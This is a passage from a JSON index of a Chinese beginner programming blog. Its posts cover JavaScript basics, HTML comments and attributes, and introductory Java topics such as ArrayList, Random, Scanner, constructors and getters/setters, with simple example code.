&lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS基本语法","slug":"JS00004基本语法","date":"2020-02-13T23:07:44.000Z","updated":"2020-02-14T04:38:50.703Z","comments":true,"path":"2020/02/14/JS00004基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00004基本语法/","excerpt":"","text":"JS基本语法 JS注释 多行注释: 用 /* */ 单行注释: 用 // 注意 1.JS中严格区分大小写 2.JS中每一条语句以分号（ ；）结尾 如果不写分号,浏览器会自动添加,但是会消耗一些系统资源,而且有些时候,浏览器会加错分号,所以在开发中分号必须要写 3.JS中会忽略多个空格和换行，所以我们可以利用空格和换行对代码进行格式化。 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //年龄 var age = 11; //身高 var height = 168.8; //在控制台上输出年龄 console.log(age); /* 在控制台上输出身高*/ console.log(height); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JavaScript的编写位置","slug":"JS00003JavaScript的编写位置","date":"2020-02-13T16:32:04.000Z","updated":"2020-02-14T04:38:46.177Z","comments":true,"path":"2020/02/14/JS00003JavaScript的编写位置/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00003JavaScript的编写位置/","excerpt":"","text":"JavaScript的编写位置 可以将js代码写在button标签中的onclick属性中 &lt;button onclick=&quot;alert('我爱你');&quot; &gt;点我一下&lt;/button&gt; 可以将js代码写在超链接的href属性中,这样当点击超链接时,就会执行js代码. &lt;a href=&quot;javascript:alert('我太爱你了');&quot;&gt;1234&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;1234&lt;/a&gt; 可以将js代码写到script标签 ( 推荐使用的方式 ) 123&lt;script type=\"text/javascript\"&gt;/*代码块*/&lt;/script&gt; 可以将js 代码编写到外部js文件中,然后通过script标签引入 外部文件后缀名以.js结尾 js代码写到外部文件中可以在不同的页面中同时引用,也可以利用浏览器的缓存机制. 注意: &lt;Script&gt;标签一旦用于引入外部文件了,就不能再编写代码在标签内部了,即使编写了浏览器也会忽略 如果需要插入其他js代码,则可以再创建一个新的script标签用于编写内部代码 123&lt;script type=\"text/javascript\" src=\"demo001.js\"&gt; &lt;/script&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"第一个JavaScript程序","slug":"JS00002第一个JavaScript程序","date":"2020-02-13T14:43:38.000Z","updated":"2020-02-14T04:38:37.197Z","comments":true,"path":"2020/02/13/JS00002第一个JavaScript程序/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/JS00002第一个JavaScript程序/","excerpt":"","text":"第一个JavaScript程序 JavaScript程序以&lt;script&gt;开头,并以&lt;/script&gt;结尾 &lt;script type=&quot;text/javascript&quot;&gt;等价于&lt;script&gt; 弹出一个警告框:用alert(&quot;内容&quot;);函数 在文本写内容用:document.write(&quot;内容&quot;); 在控制台显示内容用: console.log(&quot;内容&quot;); 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; alert(\"我爱你\"); document.write(\"我爱你\"); console.log(\"get out!\"); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JavaScript基础","slug":"JS00001JavaScript基础","date":"2020-02-13T12:57:22.000Z","updated":"2020-02-14T04:41:12.482Z","comments":true,"path":"2020/02/13/JS00001JavaScript基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/JS00001JavaScript基础/","excerpt":"","text":"JavaScript基础 起源 JavaScript诞生于1995年,它的出现主要用于处理网页中的前端验证. 所谓的前端验证,就是指检查用户输入的内容是否符合一定的规则. 比如:用户名的长度,密码的长度,邮箱的格式等. 简史 JavaScript是由网景公司发明的,起初命名为LiveScrip,后来由SUN公司的介入更名为了JavaScript. 1996年微软公司在其最新的IE3浏览器中引入了自己对JavaScript的实现JScript. 于是在市面上存在两个版本的JavaScript,一个网景公司的JavaScript和微软的JScript. 为了确保不同的浏览器上运行的JavaScript标准一致,所以几个公司共同定制了JS的标准名命名为ECMAScript. 实现 ECMAScript是一个标准,而这个标准需要由各个厂商去实现. 不同的浏览器厂商对该标准会有不同的实现. 浏览器 JavaScript实现方式 Firefox SpiderMonkey Internet Explorer JScript/Chakra Safari JavaScriptCore Chrome v8 Carakan Carakan 学习JavaScript就是学习三个部分: ECMAScript DOM BOM","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"ArrayList集合的常用方法和遍历","slug":"java00048ArrayList集合的常用方法和遍历","date":"2020-02-13T08:08:58.000Z","updated":"2020-02-13T08:25:48.734Z","comments":true,"path":"2020/02/13/java00048ArrayList集合的常用方法和遍历/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00048ArrayList集合的常用方法和遍历/","excerpt":"","text":"ArrayList集合的常用方法和遍历 public boolean add(E)方法:向集合中添加一个元素 public E remove(int index)方法:在集合中移除一个元素 public E get(int index)方法:获取指定的集合元素 public int size()方法:获取集合的长度 索引从0开始 小技巧: 输入对象数组名.fori再按下tab键,会自动生成一个 1234for(int i = 0 ;i &lt; 对象名.size();i++)&#123;&#125; 123456789101112131415161718192021222324252627import java.util.ArrayList;public class Main14&#123; public static void main(String[] args) &#123; ArrayList&lt;Dog&gt; dog = new ArrayList&lt;&gt;(); //向dog集合添加元素 dog.add(new Dog(\"小黑\",1,\"黑色\")); dog.add(new Dog(\"小黄\",2,\"黄色\")); dog.add(new Dog(\"小白\",3,\"白色\")); dog.add(new Dog(\"小pi\",4,\"黑白色\")); printAll(dog); //移除dog集合中的第2号元素,索引从0开始; dog.remove(2); printAll(dog); &#125; public static void printAll(ArrayList&lt;Dog&gt; dog) &#123; //获取dog集合的长度 for (int i = 0; i &lt; dog.size(); i++) &#123; //获取dog集合中指定第i个元素,从索引0开始 dog.get(i).printAll(); System.out.println(\"============================================\"); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ArrayList集合概述和基本使用","slug":"java00047ArrayList集合概述和基本使用","date":"2020-02-13T07:54:03.000Z","updated":"2020-02-13T08:06:57.084Z","comments":true,"path":"2020/02/13/java00047ArrayList集合概述和基本使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00047ArrayList集合概述和基本使用/","excerpt":"","text":"ArrayList集合概述和基本使用 ArrayList集合的长度是可以变化的 在java.util包中 ArrayList有一个尖括号&lt;E&gt;,代表泛型; 泛型也就是代表集合中每一个元素中的类型统一化 ,其中的E要替换为引用类型 注意: 泛型只能是引用类型,不能是基本类型. 在ArrayList类中直接打印对象名字显示的不是地址,而是内容 12345678910111213141516import java.util.ArrayList;public class Main13&#123; public static void main(String[] args) &#123; // ArrayList&lt;String&gt;代表strList集合中的元素全部都是String类型 //new ArrayList&lt;String&gt;() 等价于 new ArrayList&lt;&gt;() //从java1.7开始,右侧的尖括号中的内容可以不写,但是&lt;&gt;本身不能省略 ArrayList&lt;String&gt; strList = new ArrayList&lt;&gt;(); System.out.println(strList);//[] strList.add(\"张无忌\"); strList.add(\"张三丰\"); //直接打印对象名 System.out.println(strList);//[\"张无忌\",\"张三丰\"] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"对象数组","slug":"java00046对象数组","date":"2020-02-13T07:41:16.000Z","updated":"2020-02-13T07:52:54.312Z","comments":true,"path":"2020/02/13/java00046对象数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00046对象数组/","excerpt":"","text":"对象数组 对象数组的创建格式: 第一种方式: 类名[] 对象名 = new 类名[n];其中n代表数组的长度. 第二种方式: 类名[] 对象名 = {new 类名( [初始值] ) ,...,new 类名( [初始值] )} 注意事项: 创建了一个对象数组之后不能直接使用,因为还没有为数组分配对象. 第二种创建的对象数组可以直接使用,因为它一开始就给对象数组分配了对象 1234567891011121314151617181920212223public class Main12&#123; public static void main(String[] args) &#123; //创建对象数组,并对对象数组初始化 Dog[] dogArray = &#123;new Dog(),new Dog(),new Dog(),new Dog()&#125;; dogArray[0].setName(\"小黑\"); dogArray[0].setAge(1); dogArray[0].setColor(\"黑色\"); dogArray[1].setName(\"小白\"); dogArray[1].setAge(1); dogArray[1].setColor(\"白色\"); dogArray[2].setName(\"小黄\"); dogArray[2].setAge(1); dogArray[2].setColor(\"黄色\"); for (int i = 0; i &lt; dogArray.length; i++) &#123; dogArray[i].printAll(); System.out.println(\"=======================\"); &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java生成一个1-n的随机数","slug":"java00045生成一个1-n的随机数","date":"2020-02-13T02:02:25.000Z","updated":"2020-02-13T02:11:23.967Z","comments":true,"path":"2020/02/13/java00045生成一个1-n的随机数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00045生成一个1-n的随机数/","excerpt":"","text":"生成一个1-n的随机数 思路: 1.定义一个int变量n,随意赋值. 2.要使用Random:三个步骤,导包,创建,使用 3.如果写10,那么就是0~9,然而想要的是1-10,可以发现:整体+1:rand.nextInt(n) + 1既可. 4.打印随机数字. 12345678910111213141516import java.util.Random;public class Main10&#123; public static void main(String[] args) &#123; int n = 5; //第一步 Random rand = new Random();//第二步 for (int i = 0; i &lt; 100; i++) &#123; int num = rand.nextInt(n) + 1; //第三步 System.out.println(num);//第四步 &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Random概述和基本使用","slug":"java00044Random概述和基本使用","date":"2020-02-13T01:36:07.000Z","updated":"2020-02-13T01:54:36.195Z","comments":true,"path":"2020/02/13/java00044Random概述和基本使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00044Random概述和基本使用/","excerpt":"","text":"Random概述和基本使用 Random类是用来生成随机数字的.使用起来也是三个步骤: 1.导包 import java.util.Random 2.创建 Random rand = new Random();一般括号留空即可 3.使用 获取一个随机int数字(范围是int所有范围,有正负两种) int num = rand.nextInt(); 获取一个指定范围的随机int数字(获取范围: [ 0 ,int ) 闭合区间 ) 打印范围是0 ~ (int -1) int num = rand.nextInt(int); 1234567891011121314import java.util.Random;public class Main09&#123; public static void main(String[] args) &#123; Random rand = new Random(); //范围是负的int最大值~正的int最大值 System.out.println(\"随机数是: \" + rand.nextInt()); for(int i = 0; i &lt; 100; i++) &#123; System.out.println(rand.nextInt(100)); // 打印范围是0~99 &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"匿名对象作为方法的参数及返回值","slug":"java00043匿名对象作为方法的参数及返回值","date":"2020-02-13T01:06:43.000Z","updated":"2020-02-13T01:21:31.332Z","comments":true,"path":"2020/02/13/java00043匿名对象作为方法的参数及返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00043匿名对象作为方法的参数及返回值/","excerpt":"","text":"匿名对象作为方法的参数及返回值 快速生成局部变量的快捷键: 想快速生成一个 Dog dog = new Dog();的局部变量只需要输入new Dog(); 并按下ALT + Entter 1234567891011121314151617181920212223import java.util.Scanner;public class Main08&#123; public static void main(String[] args) &#123; scanInt(new Scanner(System.in)); Dog dog = reDog(\"小黑\", 1, \"黑色\"); System.out.println(\"=====================================\"); dog.printAll(); &#125; //使用匿名对象作为参数 public static void scanInt(Scanner sc)&#123; System.out.println(\"请输入一个数: \"); int num = sc.nextInt(); System.out.println(\"你输入的数是: \" + num); &#125; //使用匿名对象作为返回值 public static Dog reDog(String name,int age,String color)&#123; return new Dog(name,age,color); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"匿名对象的说明","slug":"java00042匿名对象的说明","date":"2020-02-13T00:52:33.000Z","updated":"2020-02-13T01:05:22.186Z","comments":true,"path":"2020/02/13/java00042匿名对象的说明/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00042匿名对象的说明/","excerpt":"","text":"匿名对象的说明 没有名称的对象称为匿名对象,格式: new 类名(); 可以直接使用匿名对象来调用类方法,格式: new 类名().方法名(); 注意事项: 匿名对象只能使用一次,下次继续使用需要从新new一个,原来那个会自动回收掉. 1234567891011121314151617import java.util.Scanner;public class Main07&#123; public static void main(String[] args) &#123; System.out.print(\"请输入一个数:\"); int num = new Scanner(System.in).nextInt();//我是匿名对象 new Dog(\"小黄\",1,\"黄色\").printAll();//我是匿名对象 System.out.println(\"==================================\"); new Dog(\"小黑\",2,\"黑白\").printAll();//我是匿名对象 &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"标签的属性","slug":"html-css00003标签的属性","date":"2020-02-12T14:25:03.000Z","updated":"2020-02-12T14:32:41.990Z","comments":true,"path":"2020/02/12/html-css00003标签的属性/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00003标签的属性/","excerpt":"","text":"标签的属性 属性: 可以通过属性来设置标签如何处理标签中的内容 在开始标签中添加属性 属性需要写在开始标签中,实际上就是一个名值对的结构 属性名 = &quot;属性值&quot;,一个标签中可以同时设置多个属性,属性之间需要使用空格隔开 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;!-- 我是注释--&gt;&lt;body&gt; &lt;h1&gt; &lt;!--通过font标签中的color属性来改变字体颜色--&gt; &lt;font color=\"red\"&gt;第一个&lt;/font&gt;网站 &lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"HTML注释","slug":"html-css00002HTML注释","date":"2020-02-12T14:17:06.000Z","updated":"2020-02-12T14:20:28.931Z","comments":true,"path":"2020/02/12/html-css00002HTML注释/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00002HTML注释/","excerpt":"","text":"HTML注释 有时候需要对程序的说明,这时候就需要用到注释. 注释语法: &lt;!-- 内容 --&gt; 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;!-- 我是注释--&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"HTML/CSS基础","slug":"html-css00001HTML-CSS基础","date":"2020-02-12T13:45:47.000Z","updated":"2020-02-12T14:15:33.801Z","comments":true,"path":"2020/02/12/html-css00001HTML-CSS基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00001HTML-CSS基础/","excerpt":"","text":"HTML/CSS基础 软件架构 C/S,客户端/服务器端 1.一般我们使用的软件都是C/S架构 2.比如系统中的软件QQ,360,office等等 3.C表示客户端,用户通过客户端来使用软件 4.S表示服务器,服务器负责处理软件的业务逻辑 特点: 1.软件使用前必须得安装 2.软件更新时,服务器和客户端得同时更新 3.C/S架构的软件不能跨平台使用 4.C/S架构的软件客户端和服务器通信采用的是自有协议,相对来说比较安全 B/S,浏览器/服务器 1.B/S本质上也是C/S,只不过B/S架构的软件,使用浏览器作为软件客户端 2.B/S架构软件通过使用浏览器访问网页的形式,来使用软件,比如:京东,淘宝,知乎等等 特点: 1.软件不需要安装,直接使用浏览器访问指定的网址即可 2.软件更新时,客户端不需要更新 3.软件可以跨平台,只要系统中有浏览器,就可以使用. 4.B/S架构的软件,客户端和服务器之间通信采用的是通用的HTTP协议,相对来说不安全,一般采取https协议 W3C标准: 一个网页主要由三部分组成:结构,表现,行为. 结构:对应的是html ,用于描述页面的结构 表现:对应的是CSS, 用于控制页面中元素的样式 行为:对应的是JavaScript , 用于响应用户操作 HTML简介 HTML(Hypertext Markup Language) 超文本标记语言 负责网页的三个要素中的结构 HTML使用标签的形式来标识网页中的不同组成部分 所谓超文本指的是超链接,使用超链接可以让我们从一个页面跳转到另一个页面. 扩展名: .html 标准格式: 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"Scanner的概述及使用","slug":"java00041Scanner的概述及使用","date":"2020-02-12T11:46:36.000Z","updated":"2020-02-13T00:32:13.072Z","comments":true,"path":"2020/02/12/java00041Scanner的概述及使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00041Scanner的概述及使用/","excerpt":"","text":"Scanner类的功能,可以实现键盘输入数据,到程序当中. 包路径:import java.util.Scanner; 使用步骤: 1 . 导包 import 包路径.类名称; 如果需要使用的目标类,和当前类位于同一个包下,则可以省略导包语句不写. 在java.lang包下的内容不需要导包,其他的包都需要import语句; 在集成环境中输入Scanner按下回车会自动进行导包; 2.创建 类名称 对象名 = new 类名称(); 3.使用 对象名.成员方法名() 获取键盘输入的一个int数字,int num = sc.nextInt(); 获取键盘输入的一串字符串: String str = sc.next(); 123456789101112131415161718192021222324252627//导包import java.util.Scanner;public class Main04&#123; public static void main(String[] args) &#123; Dog dog = new Dog(); //创建一个Scanner类 Scanner sc = new Scanner(System.in); System.out.println(\"请输入名字: \"); //输入一个字符串 dog.setName(sc.next()); System.out.println(\"请输入年龄: \"); //输入一个整数 dog.setAge(sc.nextInt()); System.out.println(\"请输入毛色: \"); //输入一个字符串 dog.setColor(sc.next()); System.out.println(\"==============================\"); dog.printAll(); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"定义一个标准的类和自动生成构造函数与setter方法/getter方法","slug":"java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法","date":"2020-02-12T00:33:34.000Z","updated":"2020-02-12T00:52:06.153Z","comments":true,"path":"2020/02/12/java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法/","excerpt":"","text":"定义一个标准的类和自动生成构造函数与setter方法/getter方法 一个标准的类 通常有四个部分组成: 所有的成员变量都要使用private关键字修饰 为每一个成员变量编写一对Getter/Setter方法 编写一个无参数的构造方法 编写一个全参数的构造方法 这样标准的类也叫做Java Bean 自动生成构造函数与setter方法/getter方法 通常定义一个标准的类只需要写私有成员变量就行了,其余部分交由编译器去生成. 生成所有私有变量的setter方法/getter 快捷键 : alt + insert 生成所有setter方法/getter方法 生成空构造函数 生成全参造函数 12345678910111213141516171819public class Main03&#123; public static void main(String[] args) &#123; //使用默认构造函数 Dog dog1 = new Dog(); dog1.setName(\"bobo\"); dog1.setAge(2); dog1.setColor(\"white\"); System.out.println(\"姓名: \" + dog1.getName() + \" 年龄: \" + dog1.getAge() + \" 毛色: \" + dog1.getColor()); System.out.println(\"====================\"); //使用全参构造函数 Dog dog2 = new Dog(\"copi\",1,\"blackAndYellow\"); //使用getter方法 System.out.println(\"姓名: \" + dog2.getName() + \" 年龄: \" + dog2.getAge() + \" 毛色: \" + dog2.getColor()); //使用setter方法 dog2.setAge(2); System.out.println(\"姓名: \" + dog2.getName() + \" 年龄: \" + dog2.getAge() + \" 毛色: \" + dog2.getColor()); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142public class Dog&#123; private String name;//姓名 private int age;//年龄 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; private String color;//毛色&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"构造方法","slug":"java00039构造方法","date":"2020-02-12T00:16:02.000Z","updated":"2020-02-12T00:31:58.939Z","comments":true,"path":"2020/02/12/java00039构造方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00039构造方法/","excerpt":"","text":"构造方法 构造方法是专门用来创建对象的方法,当我们通过关键字new来创建对象时,其实就是在调用构造方法. 构造方法的定义格式: public 类名称( [参数类型 参数名称 , ........] ){ 方法体 } 注意事项: 构造方法的名称必须和所在的类名称完全一样,就连大小写也要一样 构造方法不要写返回值类型,连void都不用写 构造方法不能return一个具体的返回值 如果没有编写如何构造方法,那么编译器将会默认定义一个空构造方法: public 类名 (){}; 一旦编写了至少一个构造方法,那么编译器将不再提供默认的构造方法. 构造方法也是可以重载的. 重载:方法名相同,参数列表不同; 12345678910111213141516public class Main02&#123; public static void main(String[] args) &#123; //默认构造函数 Student student1 = new Student(); //全参构造函数 Student student2 = new Student(\"赵敏\",20); System.out.println(\"姓名: \" + student2.getName() + \"年龄: \" + student2.getAge()); //修改年龄 student2.setAge(21); System.out.println(\"姓名: \" + student2.getName() + \"年龄: \" + student2.getAge()); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334public class Student&#123; //私有成员变量 private String name; private int age; //无参构造方法 Student()&#123; System.out.println(\"无参构造方法被调用\"); &#125;; //全参构造方法 Student(String name,int age)&#123; this.name = name; this.age = age; &#125; //设置name public void setName(String name)&#123; this.name = name; &#125; //获取name public String getName()&#123; return this.name; &#125; //设置age public void setAge(int age) &#123; this.age = age; &#125; //获取age public int getAge()&#123; return this.age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"this关键字","slug":"java00038this关键字","date":"2020-02-12T00:09:38.000Z","updated":"2020-02-12T00:14:15.293Z","comments":true,"path":"2020/02/12/java00038this关键字/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00038this关键字/","excerpt":"","text":"this关键字 当方法的局部变量和类的成员变量重名时,工具&quot;就近原则&quot;,优先使用局部变量. 如果需要访问本类的当中的成员变量,需要使用格式: this.变量名 通过谁调用的方法,谁就是this. 12345678public class Main01&#123; public static void main(String[] args) &#123; Person person = new Person(); person.name = \"王思聪\"; person.printWho(\"王健林\"); &#125;&#125; 123456789public class Person&#123; public String name; public void printWho(String name) &#123; //局部变量name和成员变量name重名,所以用this区分 System.out.println(\"你好,我是\" + name + \"\\n你好,我是\" + this.name); // \\n是换行符 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类方法中的boolean类型的get方法规则","slug":"java00037类方法中的boolean类型的get方法规则","date":"2020-02-11T22:48:52.000Z","updated":"2020-02-11T22:58:19.310Z","comments":true,"path":"2020/02/12/java00037类方法中的boolean类型的get方法规则/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00037类方法中的boolean类型的get方法规则/","excerpt":"","text":"类方法中的boolean类型的get方法规则 如果类中boolean类型的成员变量是private的,写get方法时的格式一定要是: 以is开头,后面紧跟着变量名,变量名首字符一定要大写 public boolean isXxxx() { return (boolean类型变量); } 如果是``boolean类型的成员变量是private,写set`方法时,按普通写法: public void setXxxx( boolean m_Xxxx) { Xxxx = m_Xxxx; } 1234567891011121314public class Main02&#123; public static void main(String[] args) &#123; Student student = new Student(); student.setName(\"小昭\"); //设置姓名 student.setAge(18);//设置年龄 student.setMale(false);//设置性别 System.out.println(student.getName());//获取姓名 System.out.println(student.getAge());//获取年龄 System.out.println(\"是否是男的: \" + student.isMale());//获取性别 &#125;&#125; 12345678910111213141516171819202122232425262728public class Student&#123; private String name;//学生姓名 private int age;//学生年龄 private boolean male;//学生性别,是否是男的 public String getName()&#123; return name; &#125; public int getAge()&#123; return age; &#125; public boolean isMale()&#123; return male; &#125; public void setName(String m_name)&#123; name = m_name; &#125; public void setAge(int m_age) &#123; age = m_age; &#125; public void setMale(boolean m_setMale) &#123; male = m_setMale; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"private关键字的作用及使用","slug":"java00036private关键字的作用及使用","date":"2020-02-11T10:51:53.000Z","updated":"2020-02-11T23:08:04.415Z","comments":true,"path":"2020/02/11/java00036private关键字的作用及使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00036private关键字的作用及使用/","excerpt":"","text":"private关键字的作用及使用 问题描述:定义Person的年龄时,无法阻止不合理的数值被赋值进来 解决方案:用private关键字将需要保护的成员变量进行修饰. private 数据类型 变量名 但是!超出了本类范围之外就不能再直接访问了. private成员变量的获取和设置方法规范格式: 获取:getXxxx开头,小驼峰式法,Xxxx代表私有的成员变量名 设置:setXxxx开头,小驼峰式法,Xxxx代表私有的成员变量名 public void setXxxx(int a) { ​ xxxx = a; } public int getXxxx() { return xxxx; } 1234567891011public class Main01&#123; public static void main(String[] args) &#123; Person person = new Person(); person.name = \"张无忌\"; person.setAge(18); person.setHeight(179); person.setSex(\"男\"); person.showPersonAll(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package 